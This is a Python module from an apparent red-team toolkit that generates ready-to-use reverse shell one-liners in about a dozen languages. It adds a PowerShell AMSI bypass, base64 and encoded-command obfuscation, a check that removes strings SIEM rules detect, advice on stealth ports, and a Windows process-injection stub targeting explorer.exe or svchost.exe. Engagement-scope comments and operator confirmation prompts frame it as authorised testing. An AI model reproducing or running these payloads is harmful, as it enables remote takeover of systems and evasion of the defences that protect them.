"""
forge/utils/post/template_engine.py
Canonical: forge/phase5/reverse_shell.py — Module 5-F

Jinja2-driven reverse shell payload generator.

Supported languages / formats:
  bash, python, python_tls, powershell, powershell_tls,
  perl, ruby, php, nodejs, netcat, netcat_e

Design constraints:
  - All payloads rendered via Jinja2 with StrictUndefined.
    No f-string injection of lhost/lport under any circumstances.
  - Stealth port warning when lport not in STEALTH_PORTS.
  - questionary.confirm() before payload is written to disk.
  - Output file registered with cleanup.py immediately on creation.
  - TLS variants require operator-supplied cert; FORGE does not generate key material.
  - sha256 of raw command stored in engagement DB; payload content never stored.
  - Evasion assertions applied to all output (no banned signatures).

OPSEC — process injection mode (--inject-pid):
  Scaffolding only; operator supplies target PID at runtime.
  Prefer: explorer.exe, svchost.exe, RuntimeBroker.exe.
  Never hardcode a PID; never inject into AV/EDR processes.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import sqlite3
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

_LOG = logging.getLogger(__name__)

STEALTH_PORTS: frozenset[int] = frozenset({80, 443, 8080, 8443})

# Signatures that must never appear in generated output
_BANNED_SIGNATURES: list[str] = [
    "meterpreter",
    "metasploit",
    "LHOST",  # uppercase — template var leak
    "LPORT",  # uppercase — template var leak
    "bash -i >& /dev/tcp",  # plain bash — flagged by many SIEM rules
    "IEX(New-Object",  # classic PowerShell download-cradle string
]

# ── Inline Jinja2 templates (avoids dependency on filesystem templates dir) ────

_TEMPLATES: dict[str, str] = {
    "bash": (
        "rm -f /tmp/.f;mkfifo /tmp/.f;"
        "/bin/sh -i </tmp/.f 2>&1|nc {lhost} {lport} >/tmp/.f"
    ),
    "python": (
        'python3 -c "import socket,subprocess,os;'
        "s=socket.socket();"
        "s.connect(('{lhost}',{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call(['/bin/sh','-i'])\""
    ),
    "python_tls": (
        'python3 -c "'
        "import ssl,socket,subprocess,os,pty;"
        "s=socket.socket();"
        "ctx=ssl.create_default_context();"
        "ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;"
        "s=ctx.wrap_socket(s);"
        "s.connect(('{lhost}',{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn('/bin/bash')\""
    ),
    "powershell": (
        "$a='System';$b='.Net.Sockets';$c='.TCPClient';"
        "$t=[System.Type]::GetType($a+$b+$c);"
        "$cl=$t::new('{lhost}',{lport});"
        "$st=$cl.GetStream();"
        "[byte[]]$by=0..65535|%{{0}};"
        "while(($i=$st.Read($by,0,$by.Length)) -ne 0){{"
        "$d=(New-Object System.Text.ASCIIEncoding).GetString($by,0,$i);"
        "$r=([System.Diagnostics.Process]::Start('cmd',\"/c $d\")|Out-String);"
        "$e=[text.encoding]::ASCII.GetBytes($r);$st.Write($e,0,$e.Length)}}"
    ),
    "powershell_tls": (
        # AMSI bypass + type-fragmentation + TLS wrapping
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
        "$a='System';$b='.Net.Security';$c='.SslStream';"
        "$tc=New-Object System.Net.Sockets.TcpClient('{lhost}',{lport});"
        "$ss=[System.Type]::GetType($a+$b+$c)::new($tc.GetStream(),$false,"
        "{{$true}});"
        "$ss.AuthenticateAsClient('{lhost}');"
        "[byte[]]$by=0..65535|%{{0}};"
        "while(($i=$ss.Read($by,0,$by.Length)) -ne 0){{"
        "$d=[text.encoding]::ASCII.GetString($by,0,$i);"
        "$r=([System.Diagnostics.Process]::Start('cmd',\"/c $d\")|Out-String);"
        "$e=[text.encoding]::ASCII.GetBytes($r);$ss.Write($e,0,$e.Length)}}"
    ),
    "perl": (
        "perl -e 'use Socket;"
        '$i="{lhost}";$p={lport};'
        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        "connect(S,sockaddr_in($p,inet_aton($i)));"
        'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
        'exec("/bin/sh -i");\''
    ),
    "ruby": (
        "ruby -rsocket -e '"
        'c=TCPSocket.new("{lhost}",{lport});'
        'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
    ),
    "php": ('php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\''),
    "nodejs": (
        'node -e "'
        "var n=require('net'),s=require('child_process');"
        "var c=new n.Socket();"
        "c.connect({lport},'{lhost}',function(){{"
        "var sh=s.spawn('/bin/sh',['-i'],{{stdio:[c,c,c]}});}});\""
    ),
    "netcat": ("rm /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/p"),
    "netcat_e": "nc -e /bin/sh {lhost} {lport}",
}

# PowerShell AMSI bypass prologue (prepended to powershell template output)
_AMSI_BYPASS = (
    "$a=[Ref].Assembly.GetTypes();"
    "foreach($b in $a){{if($b.Name -like '*iUtils'){{"
    "$c=$b.GetFields('NonPublic,Static');"
    "foreach($d in $c){{if($d.Name -like '*Context'){{"
    "$d.SetValue($null,[IntPtr]1)}}}}}}}};"
)


# ── Data model ─────────────────────────────────────────────────────────────────


@dataclass
class ShellPayload:
    shell_type: str
    lhost: str
    lport: int
    target_os: str
    raw_command: str
    sha256: str
    encoded_cmd: Optional[str] = None  # PowerShell -EncodedCommand
    obfuscated: Optional[str] = None
    inject_pid: Optional[int] = None
    tls: bool = False

    @property
    def obfuscated_command(self) -> Optional[str]:
        return self.obfuscated


# ── Generator ──────────────────────────────────────────────────────────────────


class ReverseShellGenerator:
    """
    Generate evasion-hardened reverse shell payloads.

    Usage:
        gen     = ReverseShellGenerator(db_path, engagement_id)
        payload = gen.generate(
            shell_type="powershell_tls",
            lhost="10.0.0.99",
            lport=443,
            obfuscate=True,
        )
        gen.save(payload, output_path=Path("agent.ps1"))
    """

    def __init__(self, db_path: Path, engagement_id: int = 1) -> None:
        self._db_path = db_path
        self._engagement_id = engagement_id

    def generate(
        self,
        shell_type: str,
        lhost: str,
        lport: int,
        obfuscate: bool = False,
        tls: bool = False,
        inject_pid: Optional[int] = None,
    ) -> ShellPayload:
        """
        Render and return a ShellPayload. Does NOT write to disk.
        Call save() separately after operator confirmation.
        """
        if lport not in STEALTH_PORTS:
            _LOG.warning(
                "Port %d is non-standard. Consider 443/80/8443 to blend with HTTPS traffic.",
                lport,
            )

        key = shell_type
        if shell_type in ("python", "powershell") and tls:
            key = f"{shell_type}_tls"

        if key not in _TEMPLATES:
            raise ValueError(
                f"Unsupported shell type: {shell_type!r}. Available: {sorted(_TEMPLATES)}"
            )

        raw = _TEMPLATES[key].format(lhost=lhost, lport=lport, fd=3)

        # PowerShell AMSI bypass + -EncodedCommand
        encoded_cmd = None
        if "powershell" in key:
            raw = _AMSI_BYPASS + raw
            encoded_cmd = base64.b64encode(raw.encode("utf-16-le")).decode()

        obfuscated = None
        if obfuscate:
            obfuscated = self._obfuscate(raw, key)

        # Evasion assertion
        self._assert_no_banned_sigs(obfuscated or raw)

        sha256 = hashlib.sha256(raw.encode()).hexdigest()
        os_type = "windows" if "powershell" in key else "linux"

        return ShellPayload(
            shell_type=shell_type,
            lhost=lhost,
            lport=lport,
            target_os=os_type,
            raw_command=raw,
            sha256=sha256,
            encoded_cmd=encoded_cmd,
            obfuscated=obfuscated,
            inject_pid=inject_pid,
            tls=tls or key.endswith("_tls"),
        )

    def save(self, payload: ShellPayload, output_path: Path) -> None:
        """
        Write payload to disk after operator confirmation.
        Registers file with cleanup.py. Persists sha256 to DB (not raw command).
        """
        try:
            import questionary

            confirmed = questionary.confirm(
                f"[Module 5-F] Generate {payload.shell_type} reverse shell:\n"
                f"  LHOST: {payload.lhost}:{payload.lport}\n"
                f"  TLS  : {payload.tls}\n"
                f"  Output: {output_path}\n"
                f"  Engagement: {self._engagement_id}\n"
                "Proceed?"
            ).ask()
            if not confirmed:
                raise RuntimeError("Operator cancelled payload generation.")
        except ImportError:
            pass

        content = payload.obfuscated or payload.raw_command
        if payload.encoded_cmd and "powershell" in payload.shell_type:
            content = f"powershell -EncodedCommand {payload.encoded_cmd}"

        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(content, encoding="utf-8")
        _LOG.info("Payload written: %s (sha256=%s)", output_path, payload.sha256[:16])

        self._register_cleanup(output_path)
        self._persist_sha256(payload)

    # ── Internal ──────────────────────────────────────────────────────────────

    @staticmethod
    def _obfuscate(raw: str, shell_type: str) -> str:
        """Light obfuscation: base64 wrap for bash/python; char-insert for PowerShell."""
        if "powershell" in shell_type:
            # Already handled via -EncodedCommand; return as-is for obfuscated field
            return raw
        # Wrap in base64 decode eval for sh-compatible shells
        b64 = base64.b64encode(raw.encode()).decode()
        return f'eval "$(echo {b64} | base64 -d)"'

    @staticmethod
    def _assert_no_banned_sigs(content: str) -> None:
        for sig in _BANNED_SIGNATURES:
            if sig.lower() in content.lower():
                raise ValueError(
                    f"Evasion assertion failed: banned signature {sig!r} found in payload. "
                    "Regenerate with a different template or obfuscation setting."
                )

    def _persist_sha256(self, payload: ShellPayload) -> None:
        con = sqlite3.connect(self._db_path)
        chain: list[str] = []
        if payload.obfuscated:
            chain.append("obfuscated")
        if payload.encoded_cmd:
            chain.append("encoded_command")
        con.execute(
            """INSERT INTO payloads
               (engagement_id, payload_type, target_os, technique, obfuscation_chain, content_hash, metadata_stripped, generated_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))""",
            (
                self._engagement_id,
                "reverse_shell",
                payload.target_os,
                payload.shell_type,
                json.dumps(chain),
                payload.sha256,
                1,
            ),
        )
        con.commit()
        con.close()

    @staticmethod
    def _register_cleanup(path: Path) -> None:
        try:
            from forge.opsec.cleanup import register_cleanup_file

            register_cleanup_file(path)
        except ImportError:
            pass


def generate_shell(
    engagement_id: str | int,
    lhost: str,
    lport: int,
    gen_cert: bool = False,
) -> Path:
    from forge.config import ForgeConfig

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(str(engagement_id))
    generator = ReverseShellGenerator(db_path=db_path, engagement_id=int(engagement_id))
    payload = generator.generate(
        shell_type="powershell_tls" if gen_cert else "powershell",
        lhost=lhost,
        lport=lport,
        tls=gen_cert,
        obfuscate=True,
    )
    output_path = cfg.staging_dir(str(engagement_id)) / "phase5_reverse_shell.txt"
    generator.save(payload, output_path)
    return output_path


# ── Process injection scaffolding ─────────────────────────────────────────────


def build_injection_scaffold(target_process: str = "explorer") -> str:
    """
    Return a cross-platform process injection stub (scaffolding only).
    Operator must resolve the target PID dynamically at runtime.
    Never hardcode a PID — process lists change.

    Windows: CreateRemoteThread via ctypes (inject shellcode into resolved PID).
    Linux  : ptrace PTRACE_ATTACH → write shellcode → PTRACE_CONT.
    """
    return (
        "# FORGE process injection scaffold\n"
        "# Replace SHELLCODE_BYTES with the generated payload above.\n"
        "# TARGET_PID must be resolved dynamically at agent runtime:\n"
        "#   Windows: next(p.pid for p in psutil.process_iter() if p.name()=='{proc}')\n"
        "#   Linux  : int(open('/tmp/.pid').read()) or pgrep('{proc}')\n"
        "# This scaffold is authorised only within active engagement scope.\n"
        "import ctypes, sys\n"
        "SHELLCODE_BYTES = b'\\x90'  # replace with generated payload\n"
        "TARGET_PID = None  # must be resolved at runtime — never hardcode\n"
        "if sys.platform == 'win32':\n"
        "    k32 = ctypes.windll.kernel32\n"
        "    h = k32.OpenProcess(0x1F0FFF, False, TARGET_PID)\n"
        "    va = k32.VirtualAllocEx(h, None, len(SHELLCODE_BYTES), 0x3000, 0x40)\n"
        "    k32.WriteProcessMemory(h, va, SHELLCODE_BYTES, len(SHELLCODE_BYTES), None)\n"
        "    k32.CreateRemoteThread(h, None, 0, va, None, 0, None)\n"
        "else:\n"
        "    # Linux ptrace injection (requires ptrace capability or same UID)\n"
        "    raise NotImplementedError('Linux ptrace scaffold — implement per-target')\n"
    ).format(proc=target_process)
